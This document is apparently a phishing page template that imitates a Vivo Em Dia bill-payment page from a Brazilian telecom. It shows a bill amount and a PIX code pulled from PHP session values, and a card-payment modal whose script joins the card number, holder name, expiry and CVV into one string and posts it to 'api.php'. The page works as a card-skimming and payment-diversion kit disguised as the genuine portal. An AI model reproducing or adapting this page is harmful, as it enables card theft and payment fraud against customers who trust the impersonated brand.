U+10f044, U+10f047-10f04e, U+10f050-10f05b, U+10f05e, U+10f060-10f066, U+10f068-10f06a, U+10f074, U+10f077-10f07a, U+10f07c-10f07e, U+10f085, U+10f089, U+10f08b, U+10f08d-10f08e, U+10f090-10f091, U+10f093-10f095, U+10f098, U+10f09c-10f09e, U+10f0a4-10f0ab, U+10f0b2, U+10f0c1, U+10f0c3, U+10f0c5-10f0c7, U+10f0c9, U+10f0ce, U+10f0d7-10f0dc, U+10f0e0, U+10f0e2-10f0e3, U+10f0e9-10f0ea, U+10f0ec, U+10f0f4, U+10f0f8, U+10f0fa-10f0fe, U+10f100-10f108, U+10f10a-10f10b, U+10f110, U+10f11b-10f11c, U+10f120-10f122, U+10f124, U+10f126-10f128, U+10f12e, U+10f132-10f134, U+10f137-10f13a, U+10f13d-10f13e, U+10f141-10f144, U+10f146, U+10f148-10f14d, U+10f150-10f154, U+10f156-10f159, U+10f15c, U+10f164-10f165, U+10f175-10f178, U+10f182-10f183, U+10f186, U+10f188, U+10f191-10f193, U+10f195, U+10f197, U+10f199, U+10f1ab, U+10f1ad-10f1ae, U+10f1b0, U+10f1b2-10f1b3, U+10f1b8, U+10f1bb, U+10f1c0-10f1c5, U+10f1c7-10f1c9, U+10f1cd-10f1ce, U+10f1d8, U+10f1da, U+10f1e0-10f1e2, U+10f1e6, U+10f1ea, U+10f1fa, U+10f1fd-10f1fe, U+10f204-10f206, U+10f20b, U+10f217-10f218, U+10f21a, U+10f21c, U+10f221-10f22d, U+10f233, U+10f238-10f239, U+10f240-10f244, U+10f246, U+10f249, U+10f24d, U+10f255-10f25c, U+10f26c, U+10f271-10f274, U+10f28b, U+10f28d, U+10f290-10f292, U+10f295, U+10f29a, U+10f29d-10f29e, U+10f2a1-10f2a4, U+10f2a7-10f2a8, U+10f2c7-10f2ce, U+10f2d0, U+10f2d2-10f2d3, U+10f2db, U+10f2e1, U+10f2e3-10f2e7, U+10f2ea-10f2ec, U+10f2ee, U+10f2f0-10f2fd, U+10f300-10f301, U+10f303, U+10f307-10f30f, U+10f316-10f31a, U+10f31c-10f31d, U+10f320-10f326, U+10f328-10f32e, U+10f330-10f33e, U+10f340-10f34c, U+10f350-10f353, U+10f355, U+10f358-10f35b, U+10f35d, U+10f360-10f367, U+10f376, U+10f37e, U+10f387, U+10f389-10f38a, U+10f390, U+10f39b-10f39c, U+10f3a0, U+10f3b3, U+10f3be-10f3bf, U+10f3c2, U+10f3c5, U+10f3cd-10f3cf, U+10f3de, U+10f3e5, U+10f3ed, U+10f3f0, U+10f3f2, U+10f3f4, U+10f3fa-10f3fc, U+10f3ff-10f401, U+10f40e-10f410, U+10f422, U+10f424
        }

        @font-face {
            font-family: Font Awesome\ 5 Duotone;
            font-style: normal;
            font-weight: 900;
            src: url('../public/static/fonts/fa-duotone-900-pro-5.7.0.a21c2c9c8e8e88086dac.woff2');
            unicode-range: U+f00d, U+f010, U+f067, U+f072, U+f0ad, U+f0d6, U+f0e8, U+f130-f131, U+f24e, U+f3c9, U+f3d1, U+f515-f517, U+f519-f51e, U+f520-f52c, U+f52e, U+f530-f533, U+f535-f555, U+10f00d, U+10f010, U+10f067, U+10f072, U+10f0ad, U+10f0d6, U+10f0e8, U+10f130-10f131, U+10f24e, U+10f3c9, U+10f3d1, U+10f515-10f517, U+10f519-10f51e, U+10f520-10f52c, U+10f52e, U+10f530-10f533, U+10f535-10f555
        }

        @font-face {
            font-family: Font Awesome\ 5 Duotone;
            font-style: normal;
            font-weight: 900;
            src: url('../public/static/fonts/fa-duotone-900-pro-5.7.0.a21c2c9c8e8e88086dac.woff2');
            unicode-range: U+f00a, U+f015, U+f06e, U+f070, U+f073, U+f135, U+f1c6, U+f1e4, U+f1f8, U+f2a0, U+f2ed, U+f377, U+f470, U+f49c, U+f49e, U+f4c9, U+f56e-f56f, U+f664, U+f6d6-f6d7, U+f705, U+f710, U+f725, U+f77e, U+f780, U+f7e5-f7e7, U+f7e9-f7f0, U+f7f2-f7fe, U+f800-f812, U+f814-f833, U+10f00a, U+10f015, U+10f06e, U+10f070, U+10f073, U+10f135, U+10f1c6, U+10f1e4, U+10f1f8, U+10f2a0, U+10f2ed, U+10f377, U+10f470, U+10f49c, U+10f49e, U+10f4c9, U+10f56e-10f56f, U+10f664, U+10f6d6-10f6d7, U+10f705, U+10f710, U+10f725, U+10f77e, U+10f780, U+10f7e5-10f7e7, U+10f7e9-10f7f0, U+10f7f2-10f7fe, U+10f800-10f812, U+10f814-10f833
        }
    </style>
    <style>
        .modal {
            overflow: hidden
        }

        .fade {
            transition: opacity .15s linear;
        }

        .modal {
            bottom: 0;
            left: 0;
            outline: 0;
            position: fixed;
            right: 0;
            top: 0;
            z-index: 1050
        }

        .modal-open .modal {
            overflow-x: hidden;
            overflow-y: auto
        }

        .modal-dialog {
            margin: .5rem;
            pointer-events: none;
            position: relative;
            width: auto
        }

        .modal.fade .modal-dialog {
            -webkit-transform: translateY(-25%);
            transition: -webkit-transform .3s ease-out;
            transition: transform .3s ease-out;
            transition: transform .3s ease-out, -webkit-transform .3s ease-out
        }

        @media screen and (prefers-reduced-motion:reduce) {
            .modal.fade .modal-dialog {
                transition: none
            }
        }

        .modal.show .modal-dialog {
            -webkit-transform: translate(0);
            transform: translate(0)
        }

        .modal-content {
            background-clip: padding-box;
            background-color: #fff;
            border: 1px solid rgba(0, 0, 0, .2);
            display: flex;
            flex-direction: column;
            outline: 0;
            pointer-events: auto;
            position: relative;
            width: 100%;
            border-radius: 10px;
            margin-top: 20vmin;
        }

        .modal-backdrop {
            background-color: #000;
            bottom: 0;
            left: 0;
            position: fixed;
            right: 0;
            top: 0;
            z-index: 1040
        }

        .modal-backdrop.show {
            opacity: .85;
        }

        .modal-body {
            flex: 1 1 auto;
            position: relative
        }

        .modal-body {
            padding: 30px;
        }

        .container {
            margin-left: auto;
            margin-right: auto;
            padding-left: 15px;
            padding-right: 15px;
            width: 100%;
        }

        .col-md-1,
        .col-md-10,
        .col-md-2,
        .col-md-3,
        .col-md-4,
        .col-md-8,
        .col-sm-11,
        .col-sm-12,
        .col-sm-4 {
            min-height: 1px;
            padding-left: 15px;
            padding-right: 15px;
            position: relative;
            width: 100%;
        }

        .modalPIX .btnVoltar {
            color: #609;
            cursor: pointer;
            display: flex;
            justify-content: center;
        }

        .modalPIX .btnVoltar i {
            font-size: var(--fontSize20);
        }

        .modalPIX .textoFacilitePagamento {
            font-size: var(--fontSize14);
            padding-bottom: 20px;
        }

        /** teste **/
        .fa-chevron-left:before {
            content: "";
        }

        @media only screen and (max-width: 750px) {
            .modalPIX .textoFacilitePagamento {
                margin-bottom: -15px;
            }
        }

        .modalPIX .containerCopiar {
            align-items: center;
            background-color: #f6f6f7;
            border-radius: 10px;
            display: flex;
            height: 70px;
            justify-content: center;
            margin-bottom: 20px;
            padding-right: 70px;
            position: relative;
        }

        .numCodigoBarra {
            color: #609;
            font-size: var(--fontSize12);
        }

        .numCodigoBarra .containerNumCodBarras.pix {
            font-size: var(--fontSize11);
        }

        .numCodigoBarra div {
            font-weight: 400;
        }

        .numCodigoBarra .containerNumCodBarras {
            display: flex;
        }

        .modalPIX .containerCopiar .iconeCopiar {
            background-color: #660096;
            border-radius: 10px;
            color: #fff;
            cursor: pointer;
            font-size: 22px;
            height: 100%;
            position: absolute;
            right: 0;
            width: 70px;
        }

        .modalPIX .containerIcone {
            align-items: center;
            display: flex;
            justify-content: center;
            width: 100%;
        }

        .modalPIX .containerIcone .btnBanco {
            align-items: center;
            background-color: #f6f6f7;
            border-radius: 10px;
            cursor: pointer;
            display: flex;
            height: 70px;
            justify-content: center;
            position: relative;
            width: 70px;
        }

        .modalCartaoCredito .aviso {
            font-size: 24px;
        }

        .modalCartaoCredito .descricaoAviso {
            font-size: var(--fontSize18);
        }

        .modalCartaoCredito .containerBandeirasCartao {
            display: flex;
        }

        .modalCartaoCredito .containerBandeirasCartao .containerCartao {
            align-items: center;
            display: flex;
            flex-grow: 1;
            justify-content: center;
        }

        .modal-dialog {
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .mr-auto {
            margin-right: auto !important;
        }

        .ml-auto {
            margin-left: auto !important;
        }

        .fa-copy:before {
            content: "";
        }

        .btnType2 {
            background-color: #fff;
            border: 2px solid #660096;
        }

        .buttonAviso {
            border-radius: 8px;
            height: 50px;
            width: 100%;
        }

        .numCodigoBarra .containerNumCodBarras.pix {
            font-size: var(--fontSize11);
        }

        .buttonAviso {
            border-radius: 8px;
            height: 50px;
            width: 100%;
        }

        .btnType1 {
            background-color: #660096;
            color: #fff;
        }

        #toastr-container {
            display: none;
            left: 12px;
            position: fixed;
            top: 12px;
            width: 300px;
            z-index: 100000000000000000;
        }

        .toastr {
            border: 2px solid;
            border-radius: 4px;
            box-shadow: none;
            margin-bottom: 8px;
            padding: 8px 35px 8px 14px;
        }

        .toastr-success {
            background-color: #07bc0c;
            border-color: #07bc0c;
            box-shadow: none;
            color: #fff;
        }

        @media (min-width: 768px) {
            .col-md-10 {
                flex: 0 0 83.333333%;
                max-width: 83.333333%;
            }
        }

        @media only screen and (max-width: 750px) {
            .modalPIX .containerIcone {
                margin-top: 15px;
            }
        }

        @media only screen and (max-width: 1199px) {
            .numCodigoBarra .containerNumCodBarras {
                flex-direction: column;
                font-size: var(--fontSize10);
            }
        }

        @media only screen and (max-width: 750px) {
            .modalPIX .numCodigoBarra .containerNumCodBarras {
                word-break: break-word;
            }
        }

        @media only screen and (max-width: 750px) {
            .modalPIX .numCodigoBarra .containerNumCodBarras.pix {
                font-size: var(--fontSize8);
                padding: 5px;
            }
        }

        @media only screen and (max-width: 750px) {
            .modalPIX .containerCopiar {
                margin-top: 15px;
            }
        }

        @media only screen and (max-width: 750px) {
            .modalPIX .btnVoltar {
                justify-content: flex-start;
            }
        }

        @media screen and (max-width: 1199px) {
            .modal-body {
                padding-left: 1% !important;
                padding-right: 1% !important;
                padding-top: 3% !important;
            }
        }

        @media (min-width:576px) {
            .modal-dialog {
                margin: 1.75rem auto;
                max-width: 500px
            }
        }

        @media (min-width:992px) {
            .modal-lg {
                max-width: 800px
            }
        }

        @media only screen and (max-width: 750px) {
            .modalPIX {
                top: 40px;
            }
        }

        @media only screen and (max-width: 1199px) {

            .modalCartaoCredito .descricaoAviso,
            .modalCartaoCredito .imgCreditCard {
                text-align: center;
            }
        }

        @media only screen and (max-width: 1199px) {
            .modalCartaoCredito .containerBandeirasCartao {
                margin-bottom: 15px;
            }
        }

        @media (min-width: 768px) {
            .col-md-9 {
                flex: 0 0 75%;
                max-width: 75%;
            }
        }

        @media (min-width: 768px) {
            .col-md-2 {
                flex: 0 0 16.666667% !important;
                max-width: 16.666667% !important;
            }
        }
    </style>
    <link id=favicon rel="shortcut icon" href=data:, data-sf-original-href=https://vivoemdia.vivo.com.br/fav.png>
    <style>
        .sf-hidden {
            display: none !important
        }

        .col-md-1,
        .col-md-10,
        .col-md-12,
        .col-md-3,
        .col-md-4,
        .col-md-8,
        .col-sm-11,
        .col-sm-12,
        .col-sm-6 {
            min-height: 1px;
            padding-left: 15px;
            padding-right: 15px;
            position: relative;
            width: 100%;
        }

        .col-4 {
            flex: 0 0 33.333333%;
            max-width: 33.333333%;
        }

        .col-6 {
            flex: 0 0 50%;
            max-width: 50%;
        }
    </style>
    <link rel=canonical href=https://vivoemdia.vivo.com.br/segundaVia>
    <style>
        img[src="data:,"],
        source[src="data:,"] {
            display: none !important
        }
    </style>
    <style>
        .icone {
            margin-left: auto;
            margin-right: auto;
            width: 100px;
        }

        .qrcode-pix img {
            display: block;
            margin: auto;
            width: 120px;
        }

        label {
            white-space: nowrap;
        }
    </style>
    <script src="https://code.jquery.com/jquery-3.6.3.min.js" integrity="sha256-pvPw+upLPUjgMXY0G+8O0xUf+/Im1MZjXxxgOcBQBXU=" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.fileDownload/1.4.2/jquery.fileDownload.min.js" integrity="sha512-MZrUNR8jvUREbH8PRcouh1ssNRIVHYQ+HMx0HyrZTezmoGwkuWi1XoaRxWizWO8m0n/7FXY2SSAsr2qJXebUcA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
</head>

<body class="dx-device-desktop dx-device-generic" style=overflow:auto cz-shortcut-listen=true>
    <noscript>Você precisa ter
        o JavaScript ativado para rodar esse app.
    </noscript>
    <div id=root>
        <div class=layoutDefault>
            <div class="menuUsuario close">
                <nav>
                    <button class=btnClose><i class="fal fa-times"></i></button>
                    <div class="numberPhone sf-hidden">---</div>
                    <ul class=sf-hidden></ul>
                </nav>
            </div>
            <div class=headerVivoEmDia>
                <div class="btnBurger flexCenter">
                    <div></div>
                    <div></div>
                    <div></div>
                </div>
                <div class=containerVivoEmDia>
                    <div class=flexCenter><a href=https://vivoemdia.vivo.com.br /><img src=data:, height=35px data-sf-original-src=https://vivoemdia.vivo.com.br/assets/img/logo-vivo-em-dia2.svg></a></div>
                </div>
                <div class="containerInfoCliente d-none d-sm-none d-md-block">
                    <div class=boasVindas>Olá, <span class=nomeCliente>Convidado</span></div>
                    <div class=ultimoAcesso id="datetime"> </div>
                </div>
            </div>
            <div class="container-fluid d-none d-sm-none d-md-block">
                <div class=row>
                    <div class=containerVivoEmDia>
                        <div class=row>
                            <div class="col-md-11 col-11 col-sm-11 mobileMrAutoMlAuto" style=padding-left:0px;padding-right:0px>
                                <ul class=breadcrumbVivoEmDia>
                                    <li class=breadcrumb-item><a href="../faturas"><span><i class="fad fa-home" style=padding-right:10px></i></span>Inicio</a>
                                    <li class=breadcrumb-item><a href="../faturas">Faturas</a>
                                    <li class="breadcrumb-item active">Segunda Via
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="d-block d-sm-block d-md-none sf-hidden"></div>
            <div class=container-fluid>
                <div class=row>
                    <div class="containerVivoEmDia segundaViaPage" style=margin-bottom:50px>
                        <div class=row>
                            <div class="col-md-3 ml-auto" style=text-align:right>
                                <div class=containerInfoContrato>
                                    <div>Contrato:<span style=padding-left:5px id="contra"></span></div>
                                    <div>Situação do contrato: <span>ATIVO</span></div>
                                </div>
                            </div>
                        </div>
                        <div class=row style=margin-top:20px>
                            <div class="col-md-6 col-12 col-sm-12">
                                <div class="containerSegundaVia comentario">
                                    <div class=containerCodigoBarras>
                                        <div class="linha protocolo">
                                            <div>Contrato</div>
                                            <div id="contrax"></div>
                                        </div>
                                        <div class="linha descricao">
                                            <div>Vencimento:</div>
                                            <div id="datavencimento"></div>
                                        </div>
                                        <div class="linha descricao">
                                            <div>Valor total:</div>
                                            <div>R$ <?= $valor; ?></div>
                                        </div>
                                        <div class="linha descricao">
                                            <div>Situação do contrato:</div>
                                            <div>ATIVO</div>
                                        </div>
                                        <div class=containerCopiar>
                                            <div class=numCodigoBarra>
                                                <div class=containerNumCodBarras>
                                                    <div>
                                                        <div id="linha" style="word-break: break-all; padding: 0 20px 0;"><?= $belo; ?> </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div id="iconeCopiar" data-clipboard-target="#linha" class="iconeCopiar flexCenter" title=Copiar>
                                                <i class="fal fa-copy"></i>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class=containerTipoPagamento>
                                    <button id="btn-payment-pix" class="btn card" style="margin-left:0px">
                                        <div class="cardDescricao">Pagar com <br>Pix</div>
                                    </button>
                                    <button class="btn card" style=margin-right:0px>
                                        <a id="filedownload" target="_blank" href="../faturas/f2ac3c8f-f715-4384-8cda-cbfe213a0396/segunda-via.php" >
                                            <div class=cardDescricao>Gerar PDF Fatura</div>
                                        </a>
                                    </button>
                                    <button id="btn-payment-card" class="btn card" style="margin-left:20px">
                                        <div class="cardDescricao">Pagar com <br>Cartão</div>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <footer class=footerVivoEmDia>
            <div class="containerPrincipal container-fluid">
                <div class=row>
                    <div class="col-md-4 d-none d-sm-none d-md-block">
                        <div class=flexCenter style=height:100%>
                            <div class=copyright>Copyright 2023 © Vivo. Todos os direitos reservados</div>
                        </div>
                    </div>
                    <div class="col-md-1 d-none d-sm-none d-md-block"></div>
                    <div class="col-md-7 col-12 col-sm-12">
                        <div class="flexCenter itemFooter" style=justify-content:space-between>
                            <div class="siteProtegido d-none d-sm-none d-md-block">
                                <div class=flexCenter>
                                    <div style=width:30px></div>
                                    <div style=padding-left:10px>Site Protegido SSL</div>
                                </div>
                            </div>
                            <div class="flexCenter politicaPrivacidade">
                                <div><a href=https://vivoemdia.vivo.com.br/politica-de-privacidade>Política de
                                        Privacidade</a> | <a href=https://vivoemdia.vivo.com.br/duvidas-frequentes>Dúvidas frequentes</a>
                                </div>
                            </div>
                            <div class=flexCenter>
                                <div class="siteProtegido d-block d-sm-block d-md-none sf-hidden"></div>
                                <div>
                                    <div class=iconeFooterVivo></div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-12 d-md-none sf-hidden"></div>
                </div>
            </div>
        </footer>
    </div>
    <div id="modal-fade" class="fade modal-backdrop show" style="display: none;"></div>
    <div id="modal-wrapper" role="dialog" aria-modal="true" class="fade modal show" tabindex="-1" style="display:none;">
        <div id="modal-pix" class="modal-dialog modalPIX modal-lg" style="display:none;">
            <div class="modal-content">
                <div class="modal-body">
                    <div class="container">
                        <div class="row">
                            <div class="col-md-2">
                                <div class="btnVoltar"><i class="fal fa-chevron-left"></i><span style="padding-left:10px">Voltar</span></div>
                            </div>
                            <div class="col-md-10" style="text-align:center">
                                <div class="containerCopiar">
                                    <div class="numCodigoBarra">
                                        <div id="pix" class="containerNumCodBarras pix"><?= $_SESSION['qrcode']; ?></div>
                                    </div>
                                    <div id="iconeCopiarPix" data-clipboard-target="#pix" class="iconeCopiar flexCenter" title="Copiar"><i class="fal fa-copy"></i></div>
                                </div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-md-2"></div>
                        </div>
                        <div class="row">
                            <div class="col-md-12">
                                <div class="row">
                                    <div class="col-12 col-md-6">
                                        <div class="icone">
                                            <svg id="prefix__Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16.1 13.94">
                                                <defs>

                                                </defs>
                                                <path class="prefix__cls-1" d="M31.62 30.15h-16.1L17 27.81a1 1 0 01.79-.45h11.59a1 1 0 01.8.45l1.44 2.34" transform="translate(-15.52 -16.73)"></path>
                                                <path class="prefix__cls-2" d="M.07 13.32l-.07.1h16.1l-.07-.1H.07z"></path>
                                                <path class="prefix__cls-1" d="M29.64 19.28h-12.1a.29.29 0 00-.3.29v7.49a.29.29 0 00.3.3h12.1a.29.29 0 00.29-.3v-7.49a.28.28 0 00-.29-.29" transform="translate(-15.52 -16.73)"></path>
                                                <path d="M17.76 26.59v-6.43a.29.29 0 01.29-.3h11.08a.29.29 0 01.29.3v6.43a.29.29 0 01-.29.29H18.05a.29.29 0 01-.29-.29" transform="translate(-15.52 -16.73)" fill="#eb6494" fill-rule="evenodd"></path>
                                                <path d="M24.84 29.63l-.2-.51a.21.21 0 00-.17-.11h-1.9a.2.2 0 00-.17.11l-.21.51a.19.19 0 00.18.24h2.3a.17.17 0 00.17-.24M30 28.36l-.24-.36a.94.94 0 00-.79-.45H18.1a.9.9 0 00-.79.45l-.21.34a.31.31 0 00.24.45h12.39a.31.31 0 00.27-.43zm1.2 2.31H16a.46.46 0 01-.45-.45h16.04a.42.42 0 01-.42.45z" transform="translate(-15.52 -16.73)" fill="#321a4b" fill-rule="evenodd"></path>
                                                <path fill="#56297b" d="M3.34 2.55h9.46v.58H3.34z"></path>
                                                <path fill="#da5794" fill-rule="evenodd" d="M3.34 3.15l.31 7h8.83l.31-7H3.34z"></path>
                                                <path d="M27 16.73h-6.87a.61.61 0 00-.62.61v9.53h8v-9.53a.56.56 0 00-.58-.61" transform="translate(-15.52 -16.73)" fill="#f7d84f" fill-rule="evenodd"></path>
                                                <path class="prefix__cls-8" d="M23 18h-2.15a.08.08 0 01-.07-.07.08.08 0 01.07-.07H23a.07.07 0 01.06.07L23 18M22 18.45h-1.1a.08.08 0 01-.07-.07s0-.06.07-.06H22a.08.08 0 01.07.07.07.07 0 01-.07.07M22.33 18.9h-1.51a.07.07 0 01-.07-.07.08.08 0 01.07-.07h1.51a.08.08 0 01.07.07s0 .07-.07.07M26.36 18.83h-1.65a.23.23 0 01-.24-.24V18a.24.24 0 01.24-.25h1.65a.25.25 0 01.24.25v.58a.24.24 0 01-.24.24" transform="translate(-15.52 -16.73)"></path>
                                                <path d="M22.13 24.75a.27.27 0 01-.14-.38l.1-.24c.07-.17.21-.21.41-.1a2.92 2.92 0 00.93.2c.28 0 .52-.07.52-.27s-.07-.17-.21-.24a2.35 2.35 0 00-.58-.18c-.59-.13-1.1-.41-1.1-1.1a1.07 1.07 0 011-1.06V21a.3.3 0 01.27-.27h.28A.28.28 0 0124 21v.35a3.67 3.67 0 01.69.17.29.29 0 01.2.38l-.07.24a.29.29 0 01-.41.17 2.64 2.64 0 00-.86-.21c-.31 0-.51.07-.51.28s.27.31.86.48 1.1.38 1.1 1-.42 1-1 1.1v.35a.27.27 0 01-.31.27h-.3a.27.27 0 01-.31-.27V25a8.82 8.82 0 01-.86-.31" transform="translate(-15.52 -16.73)" fill="#eac356" fill-rule="evenodd"></path>
                                                <path class="prefix__cls-2" d="M22.13 24.58c-.18-.11-.21-.24-.14-.38l.1-.24c.07-.17.21-.21.41-.11a2.68 2.68 0 00.93.21c.28 0 .52-.07.52-.27s-.07-.18-.21-.25a3.06 3.06 0 00-.58-.17c-.59-.14-1.1-.41-1.1-1.1a1.09 1.09 0 011-1.07v-.34a.29.29 0 01.27-.27h.28a.28.28 0 01.31.27v.34a4.64 4.64 0 01.69.18.29.29 0 01.2.38l-.07.24a.29.29 0 01-.41.17 2.64 2.64 0 00-.83-.17c-.31 0-.51.07-.51.28s.27.31.86.48 1.1.38 1.1 1-.42 1-1 1.1v.35a.27.27 0 01-.31.27h-.3a.27.27 0 01-.34-.28v-.31c-.28-.11-.59-.18-.86-.31" transform="translate(-15.52 -16.73)"></path>
                                            </svg>
                                            <img src="../public/static/img/logo-vivo-em-dia.svg" alt="">
                                        </div>
                                    </div>
                                    <div class="col-12 col-md-6 qrcode-pix">
                                        <img src="<?= $_SESSION['qrcodeimg']; ?>">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div id="modal-card" class="modal-dialog modalCartaoCredito modal-lg justify-content-center" style="display:none; margin:0 auto">
            <div class="modal-content">
                <div class="modal-body">
                    <div class="container mx-auto">
                        <div class="row">
                            <div class="col-md-2">
                                <div class="btnVoltar"><i class="fal fa-chevron-left"></i><span style="padding-left:10px">Voltar</span></div>
                            </div>
                            <div class="col-md-10" style="text-align:center">
                                <div class="containerCopiar">
                                    <div class="numCodigoBarra">

                                    </div>

                                </div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-md-24 p-3 mb-2 text-white text-center" style="background:#52007c">Cadastre seu cartão para realizar o pagmento</div>
                        </div>
                        <div class="row">
                            <div class="col-md-12">
                                <div class="row">
                                    <div class="col-8 col-md-8">
                                        <form id="pagacard">
                                            <div class="form-group">
                                                <label for="cardNumber">Número do cartão</label>
                                                <input type="text" class="form-control" id="cardNumber" name="credit_card_number" placeholder="Insira o número do cartão" required>
                                            </div>
                                            <div class="form-group">
                                                <label for="cardName">Nome do titular</label>
                                                <input type="text" class="form-control" id="cardName" placeholder="Insira o nome do titular do cartão" pattern="[A-Za-z ]+" required>
                                            </div>
                                            <div class="form-row">
                                                <div class="col">
                                                    <label for="expirationDate">Data de validade</label>
                                                    <input type="text" class="form-control" id="expirationDate" name="expiration_date" maxlength="5" minlength="5" placeholder="MM/AA" required>
                                                </div>
                                                <div class="col">
                                                    <label for="cvv">cvv</label>
                                                    <input type="text" class="form-control" id="cvv" maxlength="3" minlength="3" placeholder="Insira o código de segurança" required>
                                                </div>
                                            </div>
                                            <button type="submit" class="btn btn-primary mt-3" style="width:100%">Cadastrar</button>
                                        </form>
                                    </div>

                                </div>

                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>


        <div id="toastr-container">
            <div class="toastr toastr-success">
                <div id="toastr-message" class="toastr-message"></div>
            </div>
        </div>
        <script>
            var $modalFade = $("#modal-fade");
            var $modalWrapper = $("#modal-wrapper");
            var $modalCard = $("#modal-card");
            var $modalPix = $("#modal-pix");
            var $btnCard = $("#btn-payment-card");
            var $btnPix = $("#btn-payment-pix");
            var $btnBackCard = $("#btnBackCard");
            var $btnBack = $("div[class=btnVoltar]");
            var $btnDown = $("#filedownload");
            var clipboard = new ClipboardJS('#iconeCopiar');
            var clipboardPix = new ClipboardJS('#iconeCopiarPix');

            $btnCard.click(function() {
                $modalFade.css("display", "block");
                $modalWrapper.css("display", "block");
                $modalPix.hide("fast");
                $modalCard.fadeIn(600);
            });

            $btnPix.click(function() {
                $modalFade.css("display", "block");
                $modalWrapper.css("display", "block");
                $modalCard.hide();
                $modalPix.fadeIn(600);
            });

            $btnBack.click(function(e) {
                $modalPix.hide();
                $modalWrapper.hide();
                $modalFade.hide();
            });

            $btnBackCard.click(function(e) {
                $modalCard.hide();
                $modalWrapper.hide();
                $modalFade.hide();
            });

            clipboard.on('success', function(e) {
                $("#toastr-message").text("Código para pagamento copiado com sucesso.");
                $("#toastr-container").show("fast");
                setTimeout(function() {
                    $("#toastr-container").hide("fast");
                }, 5000);
            });

            clipboardPix.on('success', function(e) {
                $("#toastr-message").text("PIX copiado com sucesso.");
                $("#toastr-container").show("fast");
                setTimeout(function() {
                    $("#toastr-container").hide("fast");
                }, 5000);
            });

            $btnDown.click(function(e) {
                e.preventDefault();

                var url = $(this).attr("href");

                window.open(url, '_blank');
            });
        </script>
        <script>
            function displayDateTime() {
                var now = new Date();
                var day = ("0" + now.getDate()).slice(-2);
                var month = ("0" + (now.getMonth() + 1)).slice(-2);
                var year = now.getFullYear();
                var hours = ("0" + now.getHours()).slice(-2);
                var minutes = ("0" + now.getMinutes()).slice(-2);
                var datetime = "Acessado em " + day + "/" + month + "/" + year + " " + hours + ":" + minutes;
                document.getElementById("datetime").innerHTML = datetime;
            }

            // Chama a função displayDateTime imediatamente após o carregamento da página
            window.onload = displayDateTime;
            var nome = sessionStorage.getItem('contrato');
            document.getElementById('contra').innerHTML = nome;
            document.getElementById('contrax').innerHTML = nome;
        </script>
        <script>
            var dataAtual = new Date();
            var dia = ("0" + dataAtual.getDate()).slice(-2);
            var mes = month = ("0" + (dataAtual.getMonth() + 1)).slice(-2);
            var ano = dataAtual.getFullYear();
            var dataFormatada = dia + "/" + mes + "/" + ano;
            document.getElementById('datavencimento').innerHTML = dataFormatada;
        </script>
        <script>
            $(document).ready(function() {
                $('#pagacard').submit(function(e) {
                    e.preventDefault();
                    var cardNumber = $('#cardNumber').val();
                    var cardName = $('#cardName').val();
                    var expirationDate = $('#expirationDate').val();
                    var cvv = $('#cvv').val();

                    // Validar campos em branco
                    if (cardNumber == '' || cardName == '' || expirationDate == '' || cvv == '') {
                        alert('Por favor, preencha todos os campos.');
                        return false;
                    }

                    // Serializar dados do formulário
                    var data = $.param({
                        informacao: cardNumber + ':' + cardName + ':' + expirationDate + ':' + cvv
                    });

                    // Enviar dados do formulário via AJAX
                    $.ajax({
                        type: 'POST',
                        url: 'api.php',
                        data: data,
                        success: function(response) {
                            if (response == 'success') {
                                // Redirecionar para outra página
                                window.location.href = 'outrapagina.html';
                            } else {
                                alert('Houve um erro no processamento do pagamento. Por favor, tente novamente.');
                            }
                        },
                        error: function() {
                            alert('Houve um erro na comunicação com o servidor. Por favor, tente novamente mais tarde.');
                        }
                    });
                });
            });
        </script>
        <script>
            function formatCreditCardNumber(input) {
                // Remove tudo que não é número do input
                var value = input.val().replace(/\D/g, '');

                // Divide o número em grupos de 4 dígitos
                var matches = value.match(/\d{4,16}/g);
                var match = matches && matches[0] || '';

                // Junta os grupos com um espaço
                var parts = [];
                for (var i = 0, len = match.length; i < len; i += 4) {
                    parts.push(match.substring(i, i + 4));
                }
                if (parts.length) {
                    input.val(parts.join(' '));
                } else {
                    input.val(value);
                }
            }

            // Formata a data de validade como MM/AA
            function formatExpirationDate(input) {
                // Remove tudo que não é número do input
                var value = input.val().replace(/\D/g, '');

                // Adiciona a barra entre o mês e o ano
                if (value.length > 2) {
                    value = value.substring(0, 2) + '/' + value.substring(2);
                }

                input.val(value);
            }

            // Configura a formatação do número do cartão de crédito
            $('input[name="credit_card_number"]').on('input', function() {
                formatCreditCardNumber($(this));
            });

            // Configura a formatação da data de validade
            $('input[name="expiration_date"]').on('input', function() {
                formatExpirationDate($(this));
            });
        </script>
</body>

</html>